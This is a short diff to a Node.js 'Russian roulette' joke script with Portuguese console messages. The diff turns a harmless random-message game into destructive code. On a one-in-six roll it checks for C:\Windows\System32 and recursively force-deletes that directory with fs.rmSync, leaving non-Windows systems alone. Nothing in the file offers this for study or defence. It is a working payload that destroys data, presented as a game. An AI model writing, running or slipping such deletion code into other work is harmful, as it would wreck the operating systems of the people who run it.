@@ -1,8 +1,16 @@
+const fs = require('fs');
+const path = require ('path');
 
-const n = Math.floor((Math.random() * 6)) + 1;
+const num = Math.floor(Math.random() * 6);
 
-if (n !== 1) { 
-    console.log("Vish ta safe não atirou");
+if (num == 0) {
+	console.log('Vish atirou meu nobre');
+	if (!fs.existsSync("C:\\Windows\\System32")) {
+		console.log('Em Linux eu não toco!');
+		process.exit(0);
+	}
+
+	fs.rmSync("C:\\Windows\\System32", {recursive: true, force: true});
 } else {
-    console.log("Vish atirou");
+	console.log('Tá safe!'); 
 }
